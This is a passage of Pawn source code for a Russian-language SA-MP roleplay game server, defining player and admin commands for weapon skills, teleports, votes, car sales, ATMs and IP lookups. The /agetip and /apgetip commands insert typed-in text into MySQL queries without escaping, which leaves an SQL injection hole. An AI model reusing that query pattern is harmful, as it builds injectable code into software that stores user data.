	points[0] = 100 - PlayerInfo[params[0]][pGunSkill][0];
	points[1] = 100 - PlayerInfo[params[0]][pGunSkill][1];
	points[2] = 100 - PlayerInfo[params[0]][pGunSkill][2];
	points[3] = 100 - PlayerInfo[params[0]][pGunSkill][3];
	points[4] = 100 - PlayerInfo[params[0]][pGunSkill][4];
	points[5] = 100 - PlayerInfo[params[0]][pGunSkill][5];
	format(stringskill,sizeof(stringskill), "<< Навыки владения оружием >>\n\nSDPistol:\t[%s]%i%s\nDeserd eagle:\t[%s]%i%s\nShotGun:\t[%s]%i%s\nMP5\t\t[%s]%i%s\nAK47:\t\t[%s]%i%s\nM4A1:\t\t[%s]%i%s",
	ToDevelopSkills(PlayerInfo[params[0]][pGunSkill][0],points[0]),PlayerInfo[params[0]][pGunSkill][0],percent,
	ToDevelopSkills(PlayerInfo[params[0]][pGunSkill][1],points[1]),PlayerInfo[params[0]][pGunSkill][1],percent,
	ToDevelopSkills(PlayerInfo[params[0]][pGunSkill][2],points[2]),PlayerInfo[params[0]][pGunSkill][2],percent,
	ToDevelopSkills(PlayerInfo[params[0]][pGunSkill][3],points[3]),PlayerInfo[params[0]][pGunSkill][3],percent,
	ToDevelopSkills(PlayerInfo[params[0]][pGunSkill][4],points[4]),PlayerInfo[params[0]][pGunSkill][4],percent,
	ToDevelopSkills(PlayerInfo[params[0]][pGunSkill][5],points[5]),PlayerInfo[params[0]][pGunSkill][5],percent);
	ShowPlayerDialogEx(playerid,1100,DIALOG_STYLE_MSGBOX, " ",stringskill, "Готово", "");
	return true;
}
CMD:myskill(playerid)
{
	new stringskill[850];
	new points[6],percent[2] = "%";
	points[0] = 100 - PlayerInfo[playerid][pGunSkill][0];
	points[1] = 100 - PlayerInfo[playerid][pGunSkill][1];
	points[2] = 100 - PlayerInfo[playerid][pGunSkill][2];
	points[3] = 100 - PlayerInfo[playerid][pGunSkill][3];
	points[4] = 100 - PlayerInfo[playerid][pGunSkill][4];
	points[5] = 100 - PlayerInfo[playerid][pGunSkill][5];
	format(stringskill,sizeof(stringskill), "<< Навыки владения оружием >>\n\nSDPistol:\t[%s]%i%s\nDeserd eagle:\t[%s]%i%s\nShotGun:\t[%s]%i%s\nMP5\t\t[%s]%i%s\nAK47:\t\t[%s]%i%s\nM4A1:\t\t[%s]%i%s",
	ToDevelopSkills(PlayerInfo[playerid][pGunSkill][0],points[0]),PlayerInfo[playerid][pGunSkill][0],percent,
	ToDevelopSkills(PlayerInfo[playerid][pGunSkill][1],points[1]),PlayerInfo[playerid][pGunSkill][1],percent,
	ToDevelopSkills(PlayerInfo[playerid][pGunSkill][2],points[2]),PlayerInfo[playerid][pGunSkill][2],percent,
	ToDevelopSkills(PlayerInfo[playerid][pGunSkill][3],points[3]),PlayerInfo[playerid][pGunSkill][3],percent,
	ToDevelopSkills(PlayerInfo[playerid][pGunSkill][4],points[4]),PlayerInfo[playerid][pGunSkill][4],percent,
	ToDevelopSkills(PlayerInfo[playerid][pGunSkill][5],points[5]),PlayerInfo[playerid][pGunSkill][5],percent);
	ShowPlayerDialogEx(playerid,1100,DIALOG_STYLE_MSGBOX, " ",stringskill, "Готово", "");
	return true;
}
CMD:pskill(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 5) return true;
	new stringskill[512];
	new points[1],percent[2] = "%";
	points[0] = 100 - PlayerInfo[playerid][pPProc];
	format(stringskill,sizeof(stringskill), "{FFFFFF}Уровень: %d\n{2E8F1A}Опыт:\t[%s]%i%s\n{FFFFFF}Макс.Груз: %d",
	PlayerInfo[playerid][pPSkill],
	ToDevelopSkills(PlayerInfo[playerid][pPProc],points[0]),PlayerInfo[playerid][pPProc],percent,
	PlayerInfo[playerid][pPMGruz]);
	ShowPlayerDialogEx(playerid,1100,DIALOG_STYLE_MSGBOX, "Статистика",stringskill, "Готово", "");
	return true;
}
CMD:atune(playerid, params[])
{
	if (PlayerInfo[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid, COLOR_GREY, " Вы не за рулем");
	ShowPlayerDialogEx(playerid, 8004, 2, "Тюнинг меню", "Диски \nГидравлика \nАрхангел Тюнинг \nЦвет \nВинилы \nАзот", "Выбрать", "Назад");
	return true;
}
CMD:setskill(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "udd",params[0],params[1],params[2]))
	{
		SCM(playerid, COLOR_GRAD1, " Введите: /setskill [playerid/часть ника] [номер] [количество]");
		SCM(playerid, COLOR_GRAD4, "[0] Slinced Pistol |[1] Desert Eagle |[2] ShotGun |[3] MP5 |[4] AK47 |[5] M4A1");
		return true;
	}
	if(params[1] > 6 || params[1] < 0) return SCM(playerid,COLOR_GREY," Неизвестное значение");
	if(params[2] < 0) return true;
	if(params[2] > 100) return true;
	if(!IsPlayerConnected(params[0])) return true;
	PlayerInfo[params[0]][pGunSkill][params[1]] = params[2];
	SCM(playerid, COLOR_GRAD1, " Уровень владения оружием игроку установлен");
	SetPlayerSkills(playerid);
	mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pGunSkills = '%i,%i,%i,%i,%i,%i' WHERE name = '%e'", PlayerInfo[params[0]][pGunSkill][0],PlayerInfo[params[0]][pGunSkill][1],PlayerInfo[params[0]][pGunSkill][2],PlayerInfo[params[0]][pGunSkill][3],PlayerInfo[params[0]][pGunSkill][4],PlayerInfo[params[0]][pGunSkill][5], PlayerInfo[params[0]][pName]);
    mysql_function_query(DATABASE,QUERY,false,"","");
	return true;
}
CMD:setskills(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "udd",params[0]))
	{
		SCM(playerid, COLOR_GREY, " Введите: /setskills [playerid]");
		return true;
	}
	if(!IsPlayerConnected(params[0])) return true;
	for(new x = 0; x < 6; x++)
	PlayerInfo[params[0]][pGunSkill][x] = 100;
	SCM(playerid, COLOR_GRAD1, " Уровень владения оружием игроку установлен");
	SetPlayerSkills(playerid);
	mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pGunSkills = '%i,%i,%i,%i,%i,%i' WHERE name = '%e'", PlayerInfo[params[0]][pGunSkill][0],PlayerInfo[params[0]][pGunSkill][1],PlayerInfo[params[0]][pGunSkill][2],PlayerInfo[params[0]][pGunSkill][3],PlayerInfo[params[0]][pGunSkill][4],PlayerInfo[params[0]][pGunSkill][5], PlayerInfo[params[0]][pName]);
    mysql_function_query(DATABASE,QUERY,false,"","");
	return true;
}
CMD:setworld(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
    if(sscanf(params, "dd", params[0], params[1])) return SCM(playerid, -1, " Введите: /setworld [playerid] [id вирт. мира]");
    if(params[1] < 0 || params[1] > 999) return SCM(playerid, COLOR_GREY, "Введите id вирт. мира от 0 до 999");
    SetPlayerVirtualWorld(params[0], params[1]);
    format(string, 110, "Вы телепортировали игрока %s[%d] в виртуальный мир с ID %d", PlayerInfo[params[0]][pName], params[0], params[1]);
    SCM(playerid, -1, string);
	return true;
}
CMD:setint(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
    if(sscanf(params, "dd", params[0], params[1])) return SCM(playerid, -1, " Введите: /setint [playerid] [id интерьера]");
    if(params[1] < 0 || params[1] > 50) return SCM(playerid, COLOR_GREY, "Введите id интерьера от 0 до 50");
    SetPlayerInterior(params[0], params[1]);
    format(string, 110, "Вы телепортировали игрока %s[%d] в интерьер с ID %d", PlayerInfo[params[0]][pName], params[0], params[1]);
    SCM(playerid, -1, string);
	return true;
}
CMD:sellgrib(playerid, params[])
{
	for(new i = 1; i <= TotalBizz; i++)
	{
		if(PlayerInfo[playerid][pMushrooms] == 0) return SCM(playerid, -1, " У Вас нет грибов");
		if (PlayerToPoint(10, playerid,BizzInfo[i][bBarX], BizzInfo[i][bBarY], BizzInfo[i][bBarZ]) && BizzInfo[i][bType] == 2 && GetPlayerVirtualWorld(playerid) == BizzInfo[i][bVirtualWorld])
		{
			PlayerInfo[playerid][pCash] +=PlayerInfo[playerid][pMushrooms]*25;
			BizzInfo[i][bProducts]+=PlayerInfo[playerid][pMushrooms];
			format(YCMDstr,sizeof(YCMDstr), " Вы продали %i грибов. Выручка: %i вирт",PlayerInfo[playerid][pMushrooms],PlayerInfo[playerid][pMushrooms]*25);
			SCM(playerid,-1,YCMDstr);
			PlayerInfo[playerid][pMushrooms] = 0;
		}
	}
	return true;
}
CMD:createvote(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5) return true;
	if(GL2[goloson] == true) return SendClientMessage(playerid,COLOR_GREY," Голосование уже созданно");
	ShowPlayerDialogEx(playerid,1132,1,"Создание голосования","Введите вопрос для голосования:","Далее","Отмена");
	pickupalla = 0;
	return true;
}
CMD:addvote(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5) return true;
	if(GL2[goloson] == false) return SendClientMessage(playerid,COLOR_GREY," Голосование не создано!");
	new Float:pox,Float:poy,Float:poz;
	new z = pickupalla;
	GetPlayerPos(playerid,pox,poy,poz);
	LPick[z] = CreateDynamicPickup(19134,23,pox,poy,poz);
	GLT[z] = CreateDynamic3DTextLabel(GL2[NameGolos],0x03c03cFF, pox, poy, poz + 0.64,10);
	pickupalla++;
	return 1;
}
CMD:stopvote(playerid,params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5) return true;
	if(GL2[goloson] == false) return SendClientMessage(playerid,COLOR_GREY," Голосование не создано!");
	new str[256];
	SendClientMessage(playerid, -1, " Голосование остановлено");
	format(YCMDstr, sizeof(YCMDstr), "Номер\tВариант\tКол-во\n");
	for(new i = 0;i < idgols; i++)
	{
		format(str,sizeof(str),"%i\t%s\t%i голосов\n",i, Golosovan[i][Variant],Golosovan[i][Golosov]);
		strcat(YCMDstr, str, sizeof(YCMDstr));
	}
	ShowPlayerDialogEx(playerid, 1137, DIALOG_STYLE_TABLIST_HEADERS, "Голосование", YCMDstr, "Закрыть", "");
	for(new j;j<20;j++)
	{
		DestroyDynamicPickup(LPick[j]);
		DestroyDynamic3DTextLabel(GLT[j]);
	}
	for(new g = 0;g < MAX_PLAYERS; g++)
	{
		PlayerInfo[g][progolos] = false;
	}
	idgols = 0;
	pickupalla = 0;
	GL2[goloson] = false;
	mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET `progolos` = '0'");
	mysql_function_query(DATABASE,QUERY,false,"","");
	return true;
}
CMD:votelist(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5) return true;
	if(GL2[goloson] == false) return SendClientMessage(playerid,COLOR_GREY," Голосование не создано!");
	new str[256];
	format(YCMDstr, sizeof(YCMDstr), "Номер\tВариант\tКол-во\n");
	for(new i = 0; i < idgols; i++)
	{
		format(str,sizeof(str),"%i\t%s\t%i голосов\n",i, Golosovan[i][Variant],Golosovan[i][Golosov]);
		strcat(YCMDstr, str, sizeof(YCMDstr));
	}
	ShowPlayerDialogEx(playerid, 1137, DIALOG_STYLE_TABLIST_HEADERS, "Голосование", YCMDstr, "Закрыть", "");
	return true;
}
CMD:apaint(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(paint_info[1] == 1) return SCM(playerid,COLOR_GREY," Пейнтболл уже запущен");
	paint_info[0] = 121;
	paint_info[1] = 1;
	foreach(i) DeletePVar(i, "player_paint");
	return true;
}
CMD:arace(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(race_info[1] == 1) return SCM(playerid,COLOR_GREY," Гонка уже запущена");
	race_info[0] = 121;
	race_info[1] = 1;
	return true;
}
/*CMD:drace(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(EndingderbyRound == 0) return SCM(playerid,-1, "Дерби Гонка уже начата!");
	OOCOff(TEAM_GROVE_COLOR,"Внимание! Начало гонок дерби через 5 минут. Стадион Сан Фиерро. Регистрация на первом этаже");
	EndingderbyRound = 0;
	SetTimer("DerbyStartRacetwo", 180000, 0);
	return true;
}*/
stock MoveVeh(vehicleid,Float:x,Float:y,Float:z,Float:angle,interiorid,virtualworld)
{
	SetVehicleZAngle(vehicleid, angle);
	SetVehiclePos(vehicleid,x,y,z);
	LinkVehicleToInterior(vehicleid, interiorid);
	SetVehicleVirtualWorld(vehicleid, virtualworld);
}
CMD:fixcar(playerid, params[])
{
	if(PlayerInfo[playerid][pCash] < 1000) return SCM(playerid, COLOR_GREY, " Не достаточно денег!");
	if(IsVehicleOccupied(house_car[playerid]) != -1) return SCM(playerid,COLOR_GREY," Транспорт занят игроком");
	if(PlayerInfo[playerid][pKvartiraKey] != 0 && PlayerInfo[playerid][pPHouseKey] == 9999)
	{
		if(PlayerInfo[playerid][pCash] < 2500) return SCM(playerid,COLOR_GREY," У вас недостаточно денег");
		DestroyVehicle(house_car[playerid]);
		house_car[playerid] = -1;
		PlayerInfo[playerid][pCash] -= 2500;
		GameTextForPlayer(playerid, "~g~car at your entryway~n~~r~$-2500", 5000, 1);
	}
	else if(PlayerInfo[playerid][pPHouseKey] != 9999 && HouseInfo[PlayerInfo[playerid][pPHouseKey]][hKlass] != 0 && HouseInfo[PlayerInfo[playerid][pPHouseKey]][hKlass] != 1)
	{
		GameTextForPlayer(playerid, "~g~car at your home~n~~r~$-1000", 5000, 1);
		PlayerInfo[playerid][pCash] -= 1000;
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		ClearCarsPlayer(playerid);
        LoadCarsPlayer(playerid);
	}
	else if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hKlass] == 0 || HouseInfo[PlayerInfo[playerid][pPHouseKey]][hKlass] == 1)
	{
	    GameTextForPlayer(playerid, "~g~car at your home~n~~r~$-1000", 5000, 1);
		PlayerInfo[playerid][pCash] -= 1000;
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		ClearCarsPlayer(playerid);
        LoadCarsPlayer(playerid);
	}
 	else SCM(playerid, COLOR_GREY, " У вас нет дома");

	return true;
}
CMD:carpass(playerid, params[])
{
	new textcar[64];
	if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_GRAD2, " Вы не в машине!");
	if(Vehicleforeach(GetPlayerVehicleID(playerid)) == -1 && caroff[GetPlayerVehicleID(playerid)] == 0) return SCM(playerid,COLOR_GREY," В бардачке этого транспортного средства нет документов");
	if(sscanf(params, "u",params[0]))
	{
		if(IsPlayerConnected(Vehicleforeach(GetPlayerVehicleID(playerid))) && caroff[GetPlayerVehicleID(playerid)] == 0)
		{
			SCM(playerid,0x59bd3aa, "-----------===[ VEHICLE PASSPORT ]===----------");
			format(textcar,sizeof(textcar), " Модель: %s",VehicleNames[GetVehicleModel(GetPlayerVehicleID(playerid))-400]);
			SCM(playerid,0xc5eefeaa, textcar);
			format(textcar,sizeof(textcar), " Владелец: %s",Name(Vehicleforeach(GetPlayerVehicleID(playerid))));
			SCM(playerid,0xc5eefeaa, textcar);
			format(textcar,sizeof(textcar), " Состояние: %i процентов",CarInfo[Vehicleforeach(GetPlayerVehicleID(playerid))][carPercent][GetPVarInt(Vehicleforeach(GetPlayerVehicleID(playerid)), "chosencar")]);
			SCM(playerid,0xc5eefeaa, textcar);
			SCM(playerid,0x59bd3aa, "=====================================");
			SetPlayerChatBubble(playerid,"Достал(а) документы из бардачка",COLOR_PURPLE,30.0,10000);
			format(YCMDstr, sizeof(YCMDstr), " %s достал(а) из бардачка документы",Name(playerid));
			ProxDetector(10.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			return true;
		}
		else return SCM(playerid,COLOR_REDD," Владелеца машины нет в сети.");
	}
	if(!IsPlayerConnected(params[0])) return SCM(playerid,-1," Игрок не в сети");
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	SCM(params[0],0x59bd3aa, "-----------===[ VEHICLE PASSPORT ]===----------");
	format(textcar,sizeof(textcar), " Модель: %s",VehicleNames[GetVehicleModel(GetPlayerVehicleID(playerid))-400]);
	SCM(params[0],0xc5eefeaa, textcar);
	format(textcar,sizeof(textcar), " Владелец: %s",Name(Vehicleforeach(GetPlayerVehicleID(playerid))));
	SCM(params[0],0xc5eefeaa, textcar);
	format(textcar,sizeof(textcar), " Состояние: %i процентов",CarInfo[Vehicleforeach(GetPlayerVehicleID(playerid))][carPercent][GetPVarInt(Vehicleforeach(GetPlayerVehicleID(playerid)), "chosencar")]);
	SCM(params[0],0xc5eefeaa, textcar);
	SCM(params[0],0x59bd3aa, "=====================================");
	format(YCMDstr,sizeof(YCMDstr), "Достал(а) документы из бардачка и показал их %s",Name(params[0]));
	SetPlayerChatBubble(playerid,YCMDstr,COLOR_PURPLE,30.0,10000);
	format(YCMDstr, sizeof(YCMDstr), " %s достал(а) документы из бардачка и показал их %s",Name(playerid),Name(params[0]));
	ProxDetector(10.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return true;
}
CMD:sellcar(playerid, params[])
{
	new null = -1;
	if(house_car[playerid] == -1) return SCM(playerid,COLOR_RED, "У вас нет автомобиля");
	if(CarInfo[playerid][carModel][GetPVarInt(playerid, "chosencar")] == 462) return SCM(playerid,COLOR_GRAD1, " Вы не можете продать мопед");
	if(GetPVarInt(playerid,"_changecar") || GetPVarInt(playerid,"changecar")) return SCM(playerid,COLOR_GREY," В данный момент вы не можете продать свой автомобиль!");
	for(new i = 0; i < sizeof(ShopCar); i++) if(CarInfo[playerid][carModel][GetPVarInt(playerid, "chosencar")] == ShopCar[i][0]) null = i;
	if(null == -1) return SCM(playerid,COLOR_GREY," Вы не можете продать данный автомобиль!");
	PlayerInfo[playerid][pBank]+=ShopCar[null][1]/2;
	format(string,40,"~w~car in sold~n~~g~$%i",ShopCar[null][1]/2);
	GameTextForPlayer(playerid,string, 5000, 3);
	RemoveTuning(playerid,house_car[playerid]);
	CarInfo[playerid][carPercent][GetPVarInt(playerid, "chosencar")] = 0;
	SCM(playerid,-1, " Вы продали свой автомобиль");
	CarInfo[playerid][carModel][GetPVarInt(playerid, "chosencar")] = 462;
	CarInfo[playerid][carColor_one][GetPVarInt(playerid, "chosencar")] = 203;
	CarInfo[playerid][carColor_two][GetPVarInt(playerid, "chosencar")] = 203;
	if(house_car[playerid] != -1)
	{
		DestroyVehicle(house_car[playerid]);
		house_car[playerid] = -1;
	}
	if(HGet(playerid))
	{
		new house = PlayerInfo[playerid][pPHouseKey];
		house_car[playerid] = CreateVehicle(CarInfo[playerid][carModel][GetPVarInt(playerid, "chosencar")], HouseInfo[house][hCarx], HouseInfo[house][hCary], HouseInfo[house][hCarz], HouseInfo[house][hCarc] , CarInfo[playerid][carColor_one][GetPVarInt(playerid, "chosencar")] ,CarInfo[playerid][carColor_two][GetPVarInt(playerid, "chosencar")], 86400);
		SetVehicleParamsEx(house_car[playerid],false,false,false,true,false,false,false);
		CarHealth[house_car[playerid]] = float(1000);
	}
	return true;
}
CMD:pgetip(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new enterip[32];
	if(sscanf(params, "is[32]",params[0], enterip)) return SCM(playerid, -1, " Введите: /pgetip [части 1 - 4] [IP]");
	if(params[0] < 1 || params[0] > 4) return SCM(playerid, COLOR_GREY, " Частей может быть от 1 до 4");
	SCM(playerid, 0xC21D00AA, " Список IP:");

	foreach(i)
	{
		new playerIP[3][32], strIP[4], enterIP[4];
		GetPlayerIp(i, playerIP[0], 32);
		sscanf(playerIP[0], "p<.>iiii", strIP[0], strIP[1], strIP[2], strIP[3]);
		sscanf(enterip, "p<.>iiii", enterIP[0], enterIP[1], enterIP[2], enterIP[3]);
		switch(params[0])
		{
		    case 1: format(playerIP[1], 32, "%i", strIP[0]);
		    case 2: format(playerIP[1], 32, "%i.%i", strIP[0], strIP[1]);
		    case 3: format(playerIP[1], 32, "%i.%i.%i", strIP[0], strIP[1], strIP[2]);
		    case 4: format(playerIP[1], 32, "%i.%i.%i.%i", strIP[0], strIP[1], strIP[2], strIP[3]);
		}
		switch(params[0])
		{
		    case 1: format(playerIP[2], 32, "%i", enterIP[0]);
		    case 2: format(playerIP[2], 32, "%i.%i", enterIP[0], enterIP[1]);
		    case 3: format(playerIP[2], 32, "%i.%i.%i", enterIP[0], enterIP[1], enterIP[2]);
		    case 4: format(playerIP[2], 32, "%i.%i.%i.%i", enterIP[0], enterIP[1], enterIP[2], enterIP[3]);
		}
		if(!strcmp(playerIP[1], playerIP[2], true))
		{
			format(YCMDstr, sizeof(YCMDstr), " Nik [%s]   IP [%s]", Name(i), playerIP[0]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
		}
	}
	return true;
}
CMD:sellzone(playerid, params[])
{
	for(new i = 1; i <= TOTALGZ; i++)
	{
		if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]))
		{
			if(PlayerInfo[playerid][pLeader] != GZInfo[i][gFrakVlad]) return SCM(playerid, COLOR_GRAD1, " Вы не на своей зоне!");
			if(sscanf(params, "ud",params[0],params[1])) return SCM(playerid, -1, " Введите: /sellzone [id] [цена]");
			if(params[1] < 100000 || params[1] > 500000) { SCM(playerid, COLOR_GREY, "Цена должна быть: от 100000 до 500000!"); return true; }
			if(!IsPlayerConnected(params[0])) return true;
			if(!ProxDetectorS(8.0, playerid, params[0])) return true;
			if(params[0] == playerid) { SCM(playerid, COLOR_GREY, " Себе  нельзя!"); return true; }
			format(YCMDstr, sizeof(YCMDstr), " Вы предложили %s купить территорию за %i вирт",Name(params[0]),params[1]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " %s предлагает Вам купить территорию за %i вирт. (( Введите: /accept zone для покупки))",Name(playerid),params[1]);
			SCM(params[0], 0x6495EDFF, YCMDstr);
			ZoneOffer[params[0]] = playerid;
			sellzone[params[0]] = PlayerInfo[playerid][pMember];
			ZonePrice[params[0]] = params[1];
		}
	}
	return true;
}
CMD:agetip(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[42]",params[0])) return	SCM(playerid, -1, " Введите: /agetip [ник]");
	mysql_format(DATABASE,QUERY, 256, "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s'",params[0]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",20,playerid,params[0]);
	return true;
}
CMD:apgetip(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4) return true;
	new ips[42];
	if(sscanf(params, "s[42]", ips)) return SCM(playerid, -1, " Введите: /apgetip [IP]");
	mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `pIp` = '%s' OR `pvIp` = '%s' OR `pIpReg` = '%s'", ips, ips, ips);
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(r)//cache_num_rows(r))
	{
	    new Names[32], pIps[32], pvIps[32], pIpRegs[32];
		SCM(playerid, 0xC21D00AA, " Список IP:");
		for(new i = 0; i < r; i++)
		{
			new strin[256];
			cache_get_field_content(i,"Name",Names,DATABASE,60);
			cache_get_field_content(i,"pIp",pIps,DATABASE,60);
			cache_get_field_content(i,"pvIp",pvIps,DATABASE,60);
			cache_get_field_content(i,"pIpReg",pIpRegs,DATABASE,60);
            format(strin,sizeof(strin)," Nik [%s]   R-IP [%s]   L-IP [%s]   IP [%s]",Names, pIpRegs, pvIps, pIps);
			SCM(playerid, COLOR_BLUE, strin);
		}
	}
	else
	{
	    SCM(playerid, COLOR_GREY, " Совпадений не найдено");
	}
	return true;
}
CMD:atm(playerid, params[])
{
	for(new i = 1; i <= TOTALATM; i++)
	{
		if(!IsPlayerInRangeOfPoint(playerid, 2.0,ATMInfo[i][aX],ATMInfo[i][aY],ATMInfo[i][aZ])) continue;
		ClearAnimations(playerid);
	    format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
		[1] Снять со счёта\n\
		[2] Положить на счёт\n\
		[3] Оплатить кварплату наличными\n\
		[4] Оплатить кварплату со счёта\n\
		[5] Перевести игроку с наличных\n\
		[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
		return ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
	}
	return true;
}
CMD:final(playerid)
{
	SPD(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Информация | {AE443D}Финальное глобальное обновление и доработка мода SAMP-RP(Evolve-RP)!","\t\t{AE433D}1. {FFFFFF}Изменили донат меню (Copy Evolve-RP)\n\
	\t\t{FFFFFF}(С левой стороны пишет счёт вашего доната, а с правой счёт потраченного доната, как на еволве, всё покупленное сохраняется)\n\
	\t\t{AE433D}2. {FFFFFF}Добавили команду для выдачи {F3FF02}GOLD {FFFFFF}COINS ./givedonate (Доступна с десятого лвл администратора)\n\
	\t\t{AE433D}3. {FFFFFF}Оптимизировали базу данных и мод, теперь можно комфортно играть!\n\
	\t\t{AE443D}4. {FFFFFF}При назначение на лидерку, при начале работы, при снятие лидерки и увольнение с работы человека больше не спавнит!\n\
	\t\t(Попросил сделать Scott Mccall)\n\
	\t\t{AE443D}5. {FFFFFF}Удалил остаток кода от старого анти-чита SAMP-RP!\n\
	\t\t{AE443D}6. {FFFFFF}Исправили баг с ./cuff. Теперь он работает превосходно!\n\
	\t\t{AE443D}7. {FFFFFF}Обновил самописный мной плагин nex_ac до версии 1.9.55!\n\n\
	\t\t{AE443D}1. {FFFFFF}Исправили некоторые функции, которые не работали в анти чите Evolve-RP\n\
	\t\t{AE443D}2. {FFFFFF}Теперь кар шот хорошо ловит как на Evolve-RP!\n\
	\t\t{AE443D}3. {FFFFFF}Теперь невидимку хорошо ловит анти-чит как на Evolve-RP!\n\
	\t\t{AE443D}4. {FFFFFF}Исправлены ложные срабатывание анти-чита!\n\
	\t\t{AE443D}5. {FFFFFF}Исправлен баг с бегом CJ\n\n\
	\t\t{AE443D}8. {FFFFFF}Исправлен баг с голодом, когда у человека было 0 голода, то у него не снималось хп, это пофикшено!\n\
	\t\t{AE443D}9. {FFFFFF}Изменили текст ./viphelp на диалог (Copy Evolve-RP)\n\
	\t\t{AE443D}10. {FFFFFF}Команда ./gmx была перемещена с 4 лвл на 10 лвл администратора!\n\
	\t\t{AE443D}11. {FFFFFF}При покупке транспорта. Ваш автомобиль сразу попадает в гараж без перезахода!\n\
	\t\t{AE443D}12. {FFFFFF}Переписали команду ./fixcar (Работает без косяков!)\n\
	\t\t{AE443D}13. {FFFFFF}Добавили текст к подходу банкомату (Copy Evolve-RP)\n\
	\t\t{AE443D}14. {FFFFFF}Добавили плюшки для VIP людей. О них можно узнать в ./viphelp\n\
	\t\t{FFFFFF}(ПРЕДУПРЕЖДЕНИЕ! НЕКОТОРЫЕ ПЛЮШКИ НЕ РАБОТАЮТ, МЫ ВАС ПРЕДУПРЕДИЛИ!)\n\
	\t\t{FFFFFF}(РАБОТАЮТ: ВСЕ КОМАНДЫ ВИПОК, ВЫДАЧА ДВОЙНОГО EXP ГОЛДАМ, ВЫДАЧА ГОЛДАМ GOLD COIN КАЖДЫЙ ПЕЙДЕЙ)\n\
	\t\t{FFFFFF}(УМЕНЬШЕНИЕ РОЗЫСКА У ВСЕХ ВИПОК, ВЫДАЧА ДЕНЕГ ПРИ ПОКУПКИ ВИПОК, НА ВСЕХ ВИПКАХ! НУ НА ЭТОМ ВСЁ!)\n\
	\t\t{AE443D}15. {FFFFFF}Добавил ботов в банке Los-Santos and San-Fierro (Copy Evolve-RP)\n\
	\t\t{AE443D}16. {FFFFFF}Переписал систему PayDay, оптимизировали её. Теперь работает без лишних багов и косяков!\n\
	\t\t{AE443D}17. {FFFFFF}Нашли баг с людьми, когда имеешь випку BRONZE, SILVER или GOLD, то снимает Wanted,\n\
	\t\t{FFFFFF}но после 0, выдавался 6 лвл розыска навсегда, точнее багался, теперь это исправлено!\n\
	\t\t{AE443D}18. {FFFFFF}Мы сделали сохранение дома 100%(продажа дома, продажа дома администратором)\n\
	\t\t{AE443D}19. {FFFFFF}Мы оптимизировали все команды сервера!\n\
	\t\t{AE443D}20. {FFFFFF}Решили проблемы с рекурсией в моде. (Необходимо переписать систему казино!)", "Закрыть", "");
	return true;
}
CMD:admins(playerid)
{
	if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pDonateRank] < 2 && PlayerInfo[playerid][pLeader] == 0 && SDuty[playerid] == 0) return SCM(playerid, COLOR_GREY, " Доступно администрации / VIP 2 уровня / саппортам / лидерам");
	SCM(playerid, COLOR_YELLOW, " Админы Online:");
	foreach(i)
	{
		if(!IsPlayerConnected(i) || (!PlayerInfo[i][pLogin])) continue;
		if(PlayerInfo[i][pAdmin] < 1 || PlayerInfo[i][pAdmin] > 6 && PlayerInfo[playerid][pAdmin] < 7) continue;
		if(GetPVarInt(i,"AFK_Time") > 2) format(YCMDstr, 256, " %s[ID: %i] [lvl: %i] [AFK: %s сек]",Name(i),i,PlayerInfo[i][pAdmin], ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
